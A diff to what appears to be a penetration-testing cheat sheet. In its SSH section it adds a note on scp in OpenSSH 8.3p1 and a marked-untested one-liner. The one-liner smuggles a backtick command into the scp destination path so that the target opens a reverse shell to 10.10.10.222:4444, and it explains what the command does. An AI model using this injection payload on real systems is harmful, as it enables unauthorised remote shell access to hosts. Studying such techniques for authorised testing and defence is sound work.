@@ -170,9 +170,14 @@ nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-ba
 
 - If you have usernames test login with username:username
 - Vulnerable Versions: 7.2p1
+- scp in OpenSSH 8.3p1
 
 ```
 nc 10.11.1.111 22
+---------------------
+Need to know PW for this (untested)
+scp normal_file.txt user123@10.10.10.111:'`/bin/sh >& /dev/tcp/10.10.10.222/4444 0>&1`/home/user123/Desktop/'
+ = creates the file "normal_file.txt" on remote users Desktop, and runs a reverse shell to 10.10.10.222:4444
 ```
 
 ## Port 25 - Telnet
